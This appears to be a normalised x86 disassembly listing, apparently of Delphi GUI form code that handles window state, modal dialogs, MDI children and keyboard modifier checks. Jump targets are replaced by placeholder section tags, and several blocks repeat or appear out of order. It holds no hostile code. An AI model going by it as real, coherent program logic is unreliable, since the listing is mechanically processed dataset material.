mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_464624
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_462660
lea edx [ ebp - 0x24 ]
call sub_465e28
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_464624
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_464624
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_464624
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_464708
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40348c
pop esi
pop ebx
retn
sub_46472c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40348c
pop esi
pop ebx
retn
sub_464750
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44e758
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44f810
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44f810
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4647ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464d56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_468f00
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_464d39
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d40
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
push ebp
push sub_464c40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_403758#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463998
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c834
jmp r-xdata
mov eax [ rw-data ]
call sub_466084
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4484f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f2dc
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_466078
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44853c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
call sub_45f5f4
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4660b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4484f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466084
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_448d54
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4660a8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44853c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466078
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_462c48
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_462c48
jmp r-xdata
sub_4648a9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468614
call sub_403ac0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_466084
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4484f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_466078
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44853c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4660b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4484f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466084
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d40
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_448d54
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4660a8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44853c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466078
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_462c48
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_462c48
jmp r-xdata
sub_464c45
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468614
call sub_403ac0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463998
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c834
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f2dc
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d40
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
call sub_45f5f4
mov ebx eax
sub_464d8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_464de4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464e42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_464e50
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40348c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_464e7c
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_468600
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40348c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_46501c
jmp r-xdata
mov eax ebx
call sub_4650b8
mov dl 0x1
mov eax ebx
call sub_462c08
jmp r-xdata
sub_464f20
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_462594
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_4625e0
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_464f84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464ff0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40348c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4650b8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46503c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4650aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4650b1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_463894
sub_4650d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46539c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_447354
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_467574
xor edx edx
push ebp
push sub_46537f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41838c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_4665a4
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45f4a4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_46535d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_465024
xor edx edx
push ebp
push sub_4652bc
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_464f84
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_468380
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_44f2dc
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652c3
mov eax [ ebp - 0x4 ]
call sub_46501c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4652c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465367
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4665a4
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_4665a4
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418308
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4184ac
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45f558
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4653ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4653ac
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_46541c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
